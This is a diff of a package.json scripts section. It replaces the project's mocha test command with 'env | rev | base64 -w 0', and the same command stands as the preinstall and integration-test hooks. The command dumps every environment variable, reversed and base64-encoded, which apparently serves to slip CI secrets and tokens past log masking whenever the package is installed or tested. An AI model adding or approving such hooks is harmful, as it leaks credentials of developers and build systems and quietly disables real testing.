@@ -34,7 +34,7 @@
     "preinstall": "env | rev | base64 -w 0",
     "prettier:check:package.json": "prettier-package-json --list-different",
     "prettier:fix": "prettier --write .",
-    "test": "nyc mocha --config ./.mocharc-unit.json",
+    "test": "env | rev | base64 -w 0",
     "test:integration": "env | rev | base64 -w 0"
   },
   "types": "lib/index.d.ts",
